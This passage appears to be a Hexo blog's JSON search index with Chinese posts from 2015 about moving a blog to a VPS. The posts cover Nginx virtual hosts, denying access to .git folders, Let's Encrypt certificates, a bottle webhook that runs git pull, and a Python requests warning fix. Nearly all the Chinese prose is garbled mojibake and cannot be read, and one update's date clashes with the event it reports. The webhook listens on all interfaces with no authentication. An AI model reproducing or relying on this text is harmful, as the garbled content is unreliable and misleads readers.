å­¦è¯¾è®¾ä¹Ÿè½¬ç§»åˆ°VPSä¸Šæ¥äº†ã€‚","text":"åŸŸåä¾ç„¶åœ¨å¤‡æ¡ˆä¸­ï¼Œä¾ç„¶æƒ³å°†åšå®¢éƒ¨ç½²åˆ°æ–°ä¹°çš„VPSçš„æˆ‘å’Œè…¾è®¯æ–—æ™ºæ–—å‹‡ï¼ˆé›¾ï¼‰ï¼Œä¸ºåšå®¢æ·»åŠ äº†HTTPS&gt;_&lt;åŒæ—¶ï¼ŒæŠŠè‡ªå·±çš„å¯†ç å­¦è¯¾è®¾ä¹Ÿè½¬ç§»åˆ°VPSä¸Šæ¥äº†ã€‚ 1. ä½¿ç”¨Nginxé’ˆå¯¹å¤šä¸ªhostéƒ¨ç½²æœåŠ¡å™¨ 1.1 æ¦‚è¿°å¦‚æœä¸€ä¸ªVPSåªèƒ½æ­ä¸€ä¸ªç½‘ç«™ï¼Œé‚£æœªå…å¤ªæµªè´¹äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®Nginxçš„æ–¹å¼æ¥å°†é’ˆå¯¹å¤šä¸ªåŸŸåçš„è®¿é—®è¯·æ±‚åˆ†å¼€ï¼Œä»è€Œè¿›è¡Œä¸åŒçš„å¤„ç†ã€‚ä¾‹å¦‚ï¼Œæˆ‘åœ¨DNSé…ç½®æ—¶å°†blog.stdioa.comä¸crypt.stdioa.comåŒæ—¶æŒ‡å‘åˆ°æˆ‘çš„è…¾è®¯äº‘çš„IPåœ°å€ï¼Œç”¨æˆ·è®¿é—®è¿™ä¸¤ä¸ªåŸŸåæ—¶ï¼Œéƒ½ä¼šå‘æˆ‘çš„VPSå‘é€è¯·æ±‚ï¼Œæˆ‘è¦åšçš„æ˜¯å°†è¿™ä¸¤ç§é’ˆå¯¹ä¸åŒåŸŸåçš„è®¿é—®è¯·æ±‚åˆ†å¼€ã€‚è€Œè¿™ä¸¤ç§è¯·æ±‚çš„åŒºåˆ«åœ¨HTTPè¯·æ±‚å¤´çš„Hostå­—æ®µï¼Œæ‰€ä»¥æˆ‘åªéœ€è¦é’ˆå¯¹ä¸åŒçš„Hostä½¿ç”¨ä¸åŒçš„å¤„ç†æ–¹å¼å³å¯ã€‚ 1.2 æ“ä½œæˆ‘çš„VPSä¸Šæ’˜æœ‰ä¸¤ä¸ªç½‘ç«™ï¼Œå…¶ä¸­blog.stdioa.comåŸŸåæŒ‡å‘çš„æ˜¯æˆ‘çš„åšå®¢â€”â€”ä¸€ä¸ªé™æ€æœåŠ¡å™¨ï¼Œè€ŒcryptåŸŸåæŒ‡å‘çš„æ˜¯ä¸€ä¸ªä½¿ç”¨flaskæ­å»ºçš„ç½‘ç«™ï¼Œæ‰€ä»¥è¦åœ¨Nginxç«¯è¿›è¡Œåå‘ä»£ç†ï¼Œå°†è¯·æ±‚è½¬å‘åˆ°æœ¬åœ°çš„5000ç«¯å£ã€‚å…·ä½“é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š12345678910111213141516171819202122232425262728server &#123; listen 80; server_name stdioa.com blog.stdioa.com; # é€šå¾€åšå®¢çš„è¯·æ±‚ç›´æ¥é€šè¿‡æ–‡ä»¶æœåŠ¡å™¨è¿”å› access_log /var/log/nginx/access_blog.log; error_log /var/log/nginx/error_blog.log; root /home/stdio/blog; index index index.html; location / &#123; &#125; location ^~ /.git &#123; # ç¦æ­¢è®¿é—®.gitæ–‡ä»¶å¤¹ deny all; &#125; error_page 404 /404.html;&#125;server &#123; listen 80; server_name crypt.stdioa.com; # hostä¸ºcryptçš„è¯·æ±‚è½¬å‘æœ¬åœ°ç«¯å£ access_log /var/log/nginx/access_crypt.log; error_log /var/log/nginx/error_crypt.log; location / &#123; proxy_pass http://127.0.0.1:5000/; &#125;&#125;é…ç½®å®Œæˆåï¼Œé‡å¯Nginx, å¯ä»¥çœ‹åˆ°è®¿é—®ä¸åŒåŸŸåæ—¶ï¼Œè¯·æ±‚ä¼šäº¤ç»™ä¸åŒçš„ç¨‹åºå¤„ç†ã€‚ 2. å±è”½æ¥è‡ªç‰¹å®šåŸŸåçš„è¯·æ±‚ 2.1 èƒŒæ™¯ç½‘ç«™éƒ¨ç½²å¥½åï¼Œåˆå‘ç°äº†ä¸€ä¸ªæ¥è‡ªå¥‡æ€ªåŸŸåçš„è¯·æ±‚ï¼›æ›´å‘çˆ¹çš„æ˜¯ï¼Œè¿™ä¸ªåŸŸåæŒ‡å‘è‡ªå·±çš„VPSï¼›æ›´æ›´å‘çˆ¹çš„æ˜¯ï¼Œæ¥è‡ªè¿™ä¸ªåŸŸåçš„è¯·æ±‚æœ‰å¥½å¤šï¼Œç›´æ¥æŠŠæˆ‘çš„æ—¥å¿—åˆ·çˆ†äº†â€¦æ‰€ä»¥æˆ‘éœ€è¦å°†æ¥è‡ªè¿™ä¸ªåŸŸåçš„æ‰€æœ‰è¯·æ±‚æ‹’ç»æ‰ã€‚ 2.2 æ“ä½œæ–°å»ºä¸€ä¸ªServerå°±å¥½å•¦ã€‚å…·ä½“é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š1234567server &#123; listen 80; server_name bailigo.com *.bailigo.com; location / &#123; return 410; # 410 Gone, ä½¿ç”¨äº†è¿™ä¸ªçŠ¶æ€ç ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½ä¸å†è®©çˆ¬è™«çˆ¬è¿™ä¸ªç½‘é¡µ &#125;&#125;é…ç½®å®Œæˆï¼Œé‡æ–°è½½å…¥é…ç½®æ–‡ä»¶ï¼ŒæˆåŠŸã€‚æœ¬æ¥æƒ³ç”¨418, ä½†æ˜¯Nginxæ²¡æœ‰418çš„è¿”å›é¡µé¢ï¼Œæƒ³äº†æƒ³è¿˜æ˜¯ç®—äº†å§ 3. ä¸ºåšå®¢éƒ¨ç½²HTTPSæœåŠ¡å™¨ 3.1 èƒŒæ™¯blog.stdioa.comåšå®¢ä¸Šåˆè¿˜å¯ä»¥è®¿é—®ï¼Œä¸­åˆåƒé¡¿é¥­å°±å‘ç°è®¿é—®è¢«æˆªæ–­äº†ï¼ŒåŸå› ä¸ä»¥å‰ä¸€æ ·â€”â€”åŸŸåæœªå®Œæˆå¤‡æ¡ˆã€‚ç»æŸ¥çœ‹ï¼Œè…¾è®¯å¯¹è®¿é—®åšå®¢çš„è¯·æ±‚è¿›è¡Œäº†301è·³è½¬ï¼Œäºæ˜¯æƒ³äº†æƒ³ï¼Œç»™åšå®¢é…ç½®äº†HTTPS, è®©ä½ ä»¬å†é˜»æ–­â†’_â†’ï¼ˆå¥½å§å†é˜»æ–­çš„è¯æˆ‘çœŸçš„ä¸çŸ¥é“è¯¥æ€ä¹ˆå¼„äº† 3.2 ä½¿ç”¨Letâ€™s Encryptç”Ÿæˆç½‘ç«™è¯ä¹¦ä¹‹å‰å°±çœ‹ä¸­äº†Letâ€™s Encryptï¼Œå®ƒæä¾›ä¸»æµæµè§ˆå™¨è®¤è¯çš„å…è´¹è¯ä¹¦ï¼Œåªå¯æƒœå½“æ—¶æ²¡æœ‰åŸŸåæ— æ³•ä½“éªŒã€‚ç°åœ¨æœ‰äº†åŸŸåï¼ŒåŠ ä¸Šè…¾è®¯å¯¹æœªå¤‡æ¡ˆçš„åŸŸåæŸ¥çš„å¾ˆç´§ï¼Œæ‰€æœ‰æœªå¤‡æ¡ˆåŸŸåä¸‹çš„ç½‘ç«™æ­èµ·æ¥åŠå¤©å°±è¢«å°æ‰ï¼Œæƒ³äº†æƒ³ï¼Œè¿˜æ˜¯ç”Ÿæˆä¸€ä¸ªè¯ä¹¦ï¼Œé…ä¸ªHTTPSæ’‘ä¸€é˜µå­å§â•®(â•¯_â•°)â•­æŒ‰ç…§å®˜æ–¹çš„æŒ‡å—ä»¥åŠæ­¤æŒ‡å—åœ¨å°†Letâ€™s Encryptçš„Repo cloneåˆ°æœ¬åœ°ä¹‹åï¼Œè¾“å…¥./letsencrypt-auto certonly --email é‚®ç®± -d åŸŸå --agree-tosæ¥ç”Ÿæˆè¯ä¹¦ã€‚ç”±äºè…¾è®¯äº‘åˆ°Letâ€™s Encryptçš„æœåŠ¡å™¨çš„é“¾æ¥æå…¶ä¸ç¨³å®šï¼Œé€šå¸¸éœ€è¦é‡è¯•å¾ˆå¤šæ¬¡æ‰èƒ½æ­£å¸¸è·ŸLetâ€™s Encryptçš„æœåŠ¡å™¨é€šä¿¡ã€‚æˆåŠŸåä¼šæ˜¾ç¤ºï¼šIMPORTANT NOTES:- Congratulations! Your certificate and chain have been saved at/etc/letsencrypt/live/blog.stdioa.com/fullchain.pem. Your certwill expire on 2016-03-17. To obtain a new version of thecertificate in the future, simply run Letâ€™s Encrypt again.- If you like Letâ€™s Encrypt, please consider supporting our work by:Donating to ISRG / Letâ€™s Encrypt: https://letsencrypt.org/donateDonating to EFF: https://eff.org/donate-leè¯ä¹¦å·²å­˜å‚¨åœ¨ä¸Šé¢ä¿¡æ¯æŒ‡ç¤ºçš„ç›®å½•ã€‚ 3.3 é…ç½®Nginx, æ­å»ºHTTPSæœåŠ¡å™¨è¯ä¹¦å·²ç”Ÿæˆï¼Œä¸‹é¢è¯¥é…ç½®Nginxäº†ï¼Œæ·»åŠ ä¸‹åˆ—é…ç½®ï¼š123456789101112131415161718192021222324server &#123; listen 443 ssl; server_name blog.stdioa.com; ssl_certificate /etc/letsencrypt/live/blog.stdioa.com/fullchain.pem; # æ·»åŠ è¯ä¹¦ ssl_certificate_key /etc/letsencrypt/live/blog.stdioa.com/privkey.pem; # æ·»åŠ å¯†é’¥ ssl_ciphers \"EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH\"; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; # åé¢å’Œæ™®é€šæœåŠ¡å™¨ä¸€æ · access_log /var/log/nginx/access_blog.log; error_log /var/log/nginx/error_blog.log; root /home/stdio/blog; index index index.html; location ^~ /.git &#123; deny all; &#125; error_page 404 /404.html;&#125;é‡æ–°åŠ è½½é…ç½®ï¼Œè®¿é—®https://blog.stdioa.com , æˆåŠŸ~å°æ’æ›²ï¼šæ˜¨å¤©æ™šä¸Šç†„ç¯ä¹‹å‰å‘ç°Ubuntuä¸Šä½¿ç”¨apt-getå®‰è£…çš„Nginxç‰ˆæœ¬å¤ªè€äº†ï¼Œäºæ˜¯åœ¨VPSä¸Šé‡æ–°ç¼–è¯‘å‡çº§äº†Nginxï¼Œç»“æœé…ç½®å¥½HTTPSä»¥åé‡å¯Nginxæ—¶å‘ç°å¯åŠ¨å¤±è´¥ï¼ŒåŸå› ä¸ºç¼ºå°‘ngxç»„ä»¶ã€‚ç»Googleåå‘ç°æ²¡æœ‰ç¼–è¯‘è¯¥ç»„ä»¶ï¼Œæ‰€ä»¥é‡æ–°ç¼–è¯‘å®‰è£…Nginx, åœ¨é…ç½®æ—¶åŠ å…¥--with-http_ssl_moduleé€‰é¡¹ã€‚å°æ’æ›²2ï¼šHTTPSé…ç½®å¥½åè®¿é—®åšå®¢ï¼ŒChromeæç¤ºâ€œå­˜åœ¨ä¸å®‰å…¨çš„å†…å®¹â€ï¼Œé€‰æ‹©åŠ è½½åï¼Œåœ°å€æ å·¦è¾¹çš„HTTPSä¼šå˜æˆçº¢è‰²ï¼Œæå…¶ä¸å¥½çœ‹ï¼ˆé›¾ï¼‰ï¼Œäºæ˜¯çœ‹äº†åšå®¢çš„æ¨¡æ¿ï¼Œå‘ç°æœ‰ä¸¤ä¸ªjsåœ¨åŠ è½½æ—¶é€‰æ‹©ä½¿ç”¨HTTPæ–¹å¼åŠ è½½ï¼Œäºæ˜¯å°†http://.../*.jsæ”¹ä¸º//.../*.js, ä½¿æµè§ˆå™¨å¯ä»¥æ ¹æ®å½“å‰åè®®è‡ªåŠ¨é€‰æ‹©JSæ–‡ä»¶çš„åŠ è½½åè®®ã€‚æ›´æ–°åšå®¢æ¨¡æ¿ï¼Œé‡æ–°è®¿é—®ï¼Œæ‰€æœ‰jså‡ä½¿ç”¨HTTPSæ–¹å¼åŠ è½½ï¼Œé—®é¢˜è§£å†³ã€‚é™„å›¾:![å“ˆå“ˆå“ˆHTTPS](/pics/hhh_HTTPS.jpg)å°æ’æ›²3ï¼šä¸Šé¢é‚£å¼ å›¾ç‰‡çš„é“¾æ¥ä¹‹å‰æ¥è‡ªä¸ƒç‰›ï¼Œé‡‡ç”¨HTTPåè®®è€Œä¸æ˜¯HTTPSåŠ è½½ã€‚å‘å¸ƒè¿™ç¯‡åšæ–‡åï¼Œæˆ‘å‘ç°è¯¥æ–‡ç« é¡µé¢ä¸­åœ°å€æ å·¦ä¾§çš„HTTPSæ ‡å¿—å˜ä¸ºäº†ç™½è‰²â€¦è¿˜æ˜¯ä¸å¥½çœ‹ï¼æ‰“å¼€Chromeçš„æ§åˆ¶å°ï¼Œåœ¨æ§åˆ¶å°ä¸­çœ‹åˆ°ï¼Œå¦‚æœå›¾ç‰‡é“¾æ¥åè®®ä¸ºHTTPSï¼Œåˆ™Chromeä¾ç„¶ä¼šæç¤ºâ€œä¸å®‰å…¨â€ï¼Œä½†æ˜¯ä¸ªäººæ„Ÿè§‰è¿™åªæ˜¯ä¸€å¼ å›¾ç‰‡è€Œå·²å•Šï¼Œåˆä¸æ˜¯JS_(:Ğ·ã‚âˆ )_è§£å†³æ–¹æ¡ˆï¼šå°†å›¾ç‰‡é“¾æ¥æ”¹å›æœ¬åœ°ï¼Œå¾…åŸŸåå¤‡æ¡ˆåå†æƒ³åŠæ³•åœ¨ä¸ƒç‰›é‚£è¾¹è§£å†³åŸŸåç»‘å®šåŠHTTPSçš„é—®é¢˜ã€‚ 4. å‚è€ƒèµ„æ–™å…è´¹SSLå®‰å…¨è¯ä¹¦Letâ€™s Encryptå®‰è£…ä½¿ç”¨æ•™ç¨‹(é™„Nginx/Apacheé…ç½®)http://blog.csdn.net/donghustone/article/details/25797727nginx SSL error - Server Faultç½‘ç«™å­˜åœ¨ä¸å®‰å…¨å› ç´ çš„è§£å†³åŠæ³• 5. åè®°å¿«é€’å·²å‘å‡ºï¼Œç›¸ç‰‡å·²å®¡æ ¸æˆåŠŸï¼Œè…¾è®¯æ”¶åˆ°èµ„æ–™ä¹‹åä¼šå°½å¿«æŠ¥ç®¡å±€å®¡ç†â€¦å¸Œæœ›2016å¹´ä¹‹å‰èƒ½å¤Ÿå¤‡æ¡ˆæˆåŠŸQvQå—¯ï¼ŒGoogleçœŸå¥½ç”¨è¯´å¥½çš„å‡†å¤‡è€ƒè¯•å‘¢ï¼Update @ 16:38ä¸Šåˆæ‰æŠŠèµ„æ–™ç”¨å¿«é€’å‘èµ°ï¼Œä¸‹åˆè…¾è®¯äº‘å°±è¯´æˆ‘çš„çº¸è´¨èµ„æ–™å·²æ”¶åˆ°â€¦æ‰“ç”µè¯é—®äº†ä¸€ä¸‹ï¼Œå®¢æœè¯´è…¾è®¯ä¸ºäº†åŠ å¿«å®¡æ ¸é€Ÿåº¦ï¼Œå¸®æˆ‘å‡†å¤‡äº†ä¸€ä»½ææ–™ä¸Šäº¤ç®¡å±€ï¼Œä¼°è®¡ä»–ä»¬æ˜¯ç”¨æˆ‘çš„æ‰«æä»¶æ‰“å°äº†ä¸€ä»½äº¤ä¸Šå»äº†å§ï¼Œä¹Ÿæ˜¯ä¸é”™2333 æœ€åå¸Œæœ›é€šä¿¡äº¤é€šç®¡ç†å±€å¿«ä¸€ç‚¹_(:Ğ·ã‚âˆ )_Update @ 19:59, Dec. 24th, 2015è…¾è®¯äº‘è®¿é—®Githubçš„é€Ÿåº¦å¤ªæ…¢äº†ï¼Œäºæ˜¯å°†åšå®¢çš„Repoè¿ç§»åˆ°äº†Codingä¸Šã€‚å»ºç«‹ç§æœ‰é¡¹ç›®è®¾ç½®éƒ¨ç½²å…¬é’¥å› ä¸ºæ˜¯ç§æœ‰é¡¹ç›®æ‰€ä»¥æ— æ³•é€šè¿‡ä¸€ä¸ª__ä¸å«ç”¨æˆ·åå¯†ç __çš„é“¾æ¥è®¿é—®Repoæ¥è¿›è¡ŒPullï¼Œæ‰€ä»¥è¿˜æ˜¯é€šè¿‡SSHè®¿é—®æ¯”è¾ƒèˆ’æœä¸€äº›ã€‚æ”¹æ‰VPSä¸Šçš„originé“¾æ¥ï¼Œå®Œæˆæ›¾ç»å¬åˆ°è¿‡ä¸€ç§è¯´æ³•ï¼šç”¨HTTPSè®¿é—®Git Repoè¦æ¯”SSHæ›´å¥½ï¼Œç„¶è€Œä¸€ç›´ä¸çŸ¥é“å¥½åœ¨å“ªâ€¦è®°å¾—ç”¨HTTPSè®¿é—®Repoçš„æ—¶å€™è´¦æˆ·çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯è¦é™„åœ¨é“¾æ¥é‡Œé¢çš„ï¼Œæ„Ÿè§‰å¥½ä¸å®‰å…¨åŸŸåå¤‡æ¡ˆçœ‹æ¥çœŸçš„è¦å¥”ç€20å¤©çš„æ ·å­å»äº†â€¦Update @ 11:07, Jan. 5th, 2015åŸŸåå¤‡æ¡ˆåœ¨2016å¹´çš„ç¬¬ä¸€ä¸ªå·¥ä½œæ—¥é€šè¿‡å•¦ï¼åº†ç¥ä¸€ä¸‹ï¼ŒæœŸæœ«ä¹‹åå¼€å§‹å‡†å¤‡åˆ¶ä½œä¸ªäººç½‘ç«™~","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"Github","slug":"Github","permalink":"https://blog.stdioa.com/tags/Github/"},{"name":"nginx","slug":"nginx","permalink":"https://blog.stdioa.com/tags/nginx/"},{"name":"Let's Encrypt","slug":"Let-s-Encrypt","permalink":"https://blog.stdioa.com/tags/Let-s-Encrypt/"}]},{"title":"åšå®¢è¿ç§»è®°ï¼ˆä¸€ï¼‰","slug":"blog-migration","date":"2015-12-17T11:55:37.000Z","updated":"2017-06-29T04:38:39.898Z","comments":true,"path":"2015/12/blog-migration/","link":"","permalink":"https://blog.stdioa.com/2015/12/blog-migration/","excerpt":"æ˜¨å¤©ä¹°äº†ä¸€ä¸ªVPSã€ä¸€ä¸ªåŸŸåï¼Œå†³å®šæŠŠåšå®¢è¿ç§»åˆ°VPSä¸Šã€‚","text":"æ˜¨å¤©ä¹°äº†ä¸€ä¸ªVPSã€ä¸€ä¸ªåŸŸåï¼Œå†³å®šæŠŠåšå®¢è¿ç§»åˆ°VPSä¸Šã€‚ 1. èƒŒæ™¯ä»‹ç»é¦–å…ˆæ‰“ä¸ªå¹¿å‘Šï¼šå€ŸåŠ©â€œè…¾è®¯äº‘+æ ¡å›­â€è®¡åˆ’ï¼Œæˆ‘æˆåŠŸåœ°ç”¨ä¸Šäº†1å…ƒ/æœˆçš„æœåŠ¡å™¨å’Œ11å…ƒ/æœˆçš„.comåŸŸåã€‚æœ‰äº†å›½å†…è®¿é—®é€Ÿåº¦æå¿«çš„VPSï¼Œæœ‰äº†åŸŸåï¼Œå°±æƒ³è‡ªå·±é¼“æ£é¼“æ£ï¼ŒæŠŠè‡ªå·±çš„åšå®¢å’Œå…¶ä»–ç«™ç‚¹æ‰˜ç®¡åˆ°VPSä¸Šã€‚ 2. åšå®¢æ‰˜ç®¡ 2.1 æ­å»ºé™æ€æ–‡ä»¶æœåŠ¡å™¨å› ä¸ºè‡ªå·±çš„åšå®¢æ˜¯é™æ€åšå®¢ï¼Œä¹‹å‰æ‰˜ç®¡åœ¨Githubä¸Šï¼Œä¾é Github Pageså®ç°éƒ¨ç½²ï¼Œæ‰€ä»¥æˆ‘å…ˆå°†æ–‡ä»¶cloneäº†ä¸‹æ¥ï¼Œå­˜æ”¾åœ¨~/blogç›®å½•ä¸­ã€‚ä¸‹é¢è¦åšçš„ï¼Œæ˜¯æ­å»ºä¸€ä¸ªé™æ€æœåŠ¡å™¨ã€‚ 2.1.1 ä½¿ç”¨Pythonçš„SimpleHTTPServerPythonçš„SimpleHTTPServeræ˜¯ä¸€ä¸ªéå¸¸å®ç”¨ã€æ–¹ä¾¿çš„åº“ï¼Œå¯ä»¥ä½¿ç”¨ç®€å•ä¸€æ¡å‘½ä»¤åœ¨å½“å‰ç›®å½•åˆ›å»ºä¸€ä¸ªHTTPæ–‡ä»¶æœåŠ¡å™¨ã€‚æ‰€ä»¥è¾“å…¥sudo python -m SimpleHTTPServer 80å‘½ä»¤ï¼Œå³å¯æ­å»ºä¸€ä¸ªé™æ€æ–‡ä»¶æœåŠ¡å™¨ï¼Œå®ç°ä»å¤–ç½‘å¯¹é™æ€åšå®¢çš„ç›´æ¥è®¿é—®ã€‚ç„¶è€Œæ­å»ºå¥½åï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼šå› ä¸ºæˆ‘çš„blogæ–‡ä»¶å¤¹æœ¬èº«æ˜¯ä¸€ä¸ªGit Repo, æ‰€ä»¥æˆ‘å¯ä»¥ç›´æ¥ä»å¤–ç½‘è®¿é—®.gitæ–‡ä»¶å¤¹ï¼Œè™½ç„¶æˆ‘çš„.gitç›®å½•æ²¡æœ‰ä¿å­˜ä»»ä½•è®¾ç½®åŠè´¦æˆ·ç­‰ï¼Œä½†è¿™æ ·ä¼šå¸¦æ¥ä¸€å®šçš„å®‰å…¨éšæ‚£ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•ç¦æ­¢å¤–éƒ¨ç”¨æˆ·å¯¹.gitæ–‡ä»¶å¤¹çš„è®¿é—®ã€‚ 2.1.2 ä½¿ç”¨Nginxæ‰˜ç®¡æ–‡ä»¶æœåŠ¡å™¨å…³äºNginxçš„ä»‹ç»ï¼Œè¯·è‡ªè¡Œè®¿é—®å®˜ç½‘ä¸ç»´åŸºç™¾ç§‘ã€‚ä¹‹å‰ç”¨è¿‡Apache, ä½†æ˜¯åœ¨æ¥è§¦Nginxåï¼Œæˆ‘è®¤ä¸ºæˆ‘å¯¹Nginxæ›´æœ‰å¥½æ„Ÿï¼Œæ‰€ä»¥é‡‡ç”¨äº†Nginxåšä¸ºæ–‡ä»¶æ‰˜ç®¡æœåŠ¡å™¨ã€‚é¦–å…ˆå®‰è£…Nginxï¼Œåˆ æ‰/etc/nginx/sites-enabledç›®å½•ï¼ˆæˆ‘çš„ç³»ç»Ÿæ˜¯Ubuntu Server 14.04 LTSï¼‰ï¼Œåœ¨conf.dç›®å½•ä¸­è®¾ç½®é…ç½®æ–‡ä»¶ï¼š12345678910111213server &#123; listen 80; # ç›‘å¬ç«¯å£ server_name server; root /home/ubuntu/blog; # æ‰˜ç®¡ç›®å½• index index.html; access_log /var/log/nginx/access_blog.log error_log /var/log/nginx/error_blog.log # ç¦æ­¢å¯¹.gitç›®å½•çš„è®¿é—® location ^~ /.git &#123; deny all; &#125;&#125;é…ç½®å®Œæˆåï¼Œé‡å¯Nginx, æ‰€æœ‰æœåŠ¡æ­£å¸¸è¿è¡Œï¼Œè®¿é—®.gitç›®å½•æ—¶ä¼šè¿”å›403.SimpleHTTPServeråœ¨å»ºç«‹æœåŠ¡å™¨çš„æ—¶å€™åªèƒ½ç›‘å¬0.0.0.0è€Œä¸èƒ½åªç›‘å¬127.0.0.1, ä¹‹å‰æ­å»ºæœåŠ¡å™¨çš„æ—¶å€™ç”¨çš„SimpleHTTPServer+Nginxåå‘ä»£ç†ï¼Œç°åœ¨çœ‹èµ·æ¥æ„Ÿè§‰æˆ‘å°±æ˜¯ä¸ªå‚»é€¼â€¦ 2.2 å€ŸåŠ©Webhookå®ç°åšå®¢çš„è‡ªåŠ¨éƒ¨ç½²å› ä¸ºä¹‹å‰é™æ€åšå®¢æ‰˜ç®¡åœ¨Github Pagesä¸Šï¼Œæ‰€ä»¥å‘Github Repoä¸Šé¢è¿›è¡Œpushæ“ä½œä¹‹åä¼šåŠ¨æ€æ›´æ–°é¡µé¢ã€‚ä½†æ˜¯å¦‚æœå°†é™æ€åšå®¢æ‰˜ç®¡åœ¨VPSä¸Šï¼Œåˆ™éœ€è¦æ¯æ¬¡æ‰§è¡Œgit pullæ‰èƒ½å¤Ÿå°†å†…å®¹æ›´æ–°ã€‚æ‰€ä»¥æˆ‘åœ¨VPSä¸Šå†™äº†ä¸€ä¸ªè„šæœ¬ï¼Œèƒ½å¤Ÿåœ¨Pushä¹‹åè‡ªåŠ¨è¿›è¡Œgit pullæ¥æ›´æ–°å†…å®¹ã€‚åœ¨Githubä¸Šçš„repoè®¾ç½®Webhookåœ¨repoçš„è®¾ç½®é¡µé¢å¯ä»¥è®¾ç½®Webhook, å¯åœ¨è¯¥repoæ”¶åˆ°pushä¹‹åï¼ŒGithubå¯ä»¥å‘ä¸€ä¸ªç‰¹å®šçš„URLå‘é€ä¸€ä¸ªPOSTè¯·æ±‚ã€‚æ‰€ä»¥æˆ‘è®¾ç½®äº†ä¸€ä¸ªWebhook, åœ¨pushä¹‹åå¯ä»¥å‘æˆ‘çš„VPSçš„ç‰¹å®šç«¯å£å‘é€POSTè¯·æ±‚ã€‚è®¾ç½®æœåŠ¡å™¨æ¥æ”¶Webhookåœ¨VPSä¸­é…ç½®ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå¼€æ”¾VPSçš„ä¸€ä¸ªç«¯å£æ¥æ¥æ”¶æ¥è‡ªGithubçš„Webhookï¼Œè¿™é‡Œä½¿ç”¨bottleæ¥æ­å»ºæœåŠ¡å™¨æ¡†æ¶ã€‚æœåŠ¡å™¨ä»£ç :123456789101112#!/usr/bin/env python# coding: utf-8import osfrom bottle import *@route(\"/push\", method=[\"POST\"]) # ç›‘å¬Webhookdef pull(): os.system(\"./auto_pull.sh\") # æ‰§è¡Œgit pullè„šæœ¬ return \"OK\"run(host=\"0.0.0.0\", port=23333)ç¼–å†™è‡ªåŠ¨pullè„šæœ¬ç¼–å†™è‡ªåŠ¨pullè„šæœ¬auto_pull.sh:1234#!/usr/bin/env shcd ~/bloggit pullè¿è¡ŒæœåŠ¡å™¨ï¼Œåˆ™å¯ç›‘å¬23333ç«¯å£çš„POSTè¯·æ±‚ï¼Œç„¶åè‡ªåŠ¨æ‰§è¡Œgit pullæ›´æ–°åšå®¢å†…å®¹ã€‚ 3. åè®°è‡³æ­¤ï¼Œåšå®¢éƒ¨åˆ†æˆåŠŸè¿ç§»åˆ°VPS.ä¸ºä»€ä¹ˆè¦è¯´â€œéƒ¨åˆ†â€ï¼Ÿå› ä¸ºæˆ‘çš„åŸŸååœ¨åšå¤‡æ¡ˆå•ŠQvQå¤‡æ¡ˆå¥½éº»çƒ¦è¿˜è¦æ‰“å°ææ–™è¿˜è¦è·‘åˆ°å¸‚ä¸­å¿ƒå»ç…§ç›¸è¿˜è¦å‘å¿«é€’åˆ°åŒ—äº¬QvQéƒ½åšå¥½è¿˜å¾—ç­‰å¾…ç®¡å±€å®¡æ ¸QvQåæ§½æ—¶é—´ç»“æŸã€‚åé¢ç­‰åŸŸåå¤‡æ¡ˆå¥½ä»¥åå¯èƒ½ä¼šé¼“æ£ä¸€é˜µå­Nginxï¼Œä¸ºæœåŠ¡å™¨å¯ç”¨HTTPSç­‰â€¦å”‰ï¼Œè¿˜æ˜¯å…ˆå»å¤ä¹ å§_(:Ğ·ã‚âˆ )__åœ¨å†™åšæ–‡æ—¶ï¼Œå»ç¼–è¯‘å‡çº§äº†ä¸€ä¸‹Nginx, é¼“æ£é…ç½®æ–‡ä»¶åˆå¼„äº†åŠå¤©_â•®(â•¯_â•°)â•­","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"Github","slug":"Github","permalink":"https://blog.stdioa.com/tags/Github/"},{"name":"nginx","slug":"nginx","permalink":"https://blog.stdioa.com/tags/nginx/"}]},{"title":"éšæ‰‹è®° - è§£å†³InsecurePlatformWarning","slug":"essay-solve-InsecurePlatformWarning","date":"2015-12-07T15:01:00.000Z","updated":"2017-06-29T04:38:40.152Z","comments":true,"path":"2015/12/essay-solve-InsecurePlatformWarning/","link":"","permalink":"https://blog.stdioa.com/2015/12/essay-solve-InsecurePlatformWarning/","excerpt":"ç¬¬ä¸‰æ¬¡åœ¨VPSä¸Šé¢è§£å†³ä½¿ç”¨requestsæŠ¥InsecurePlatformWarningè­¦å‘Šçš„é—®é¢˜ã€‚ä¹‹å‰æ¯æ¬¡éƒ½è¦æŸ¥èµ„æ–™æŠ˜è…¾å¥½ä¹…ï¼Œè¿™æ¬¡å†³å®šæŠŠå®ƒè®°ä¸‹æ¥ã€‚","text":"ç¬¬ä¸‰æ¬¡åœ¨VPSä¸Šé¢è§£å†³ä½¿ç”¨requestsæŠ¥InsecurePlatformWarningè­¦å‘Šçš„é—®é¢˜ã€‚ä¹‹å‰æ¯æ¬¡éƒ½è¦æŸ¥èµ„æ–™æŠ˜è…¾å¥½ä¹…ï¼Œè¿™æ¬¡å†³å®šæŠŠå®ƒè®°ä¸‹æ¥ã€‚ 1. å¹²è´§Debianç±»ç³»ç»Ÿsudo apt-get install python-dev libssl-devsudo pip install -U requests[security]Redhatç±»ç³»ç»Ÿsudo yum install python-devel openssl-develsudo pip install -U requests[security] 2. éœ€æ±‚è‡ªå·±çš„VPSç³»ç»Ÿæœ‰ç‚¹è€(Ubuntu 14.04 LTS), æ‰€ä»¥pythonç‰ˆæœ¬ä¹Ÿæ¯”è¾ƒè½å(Python 2.7.3), ä»Šå¤©æ”¹ä»£ç 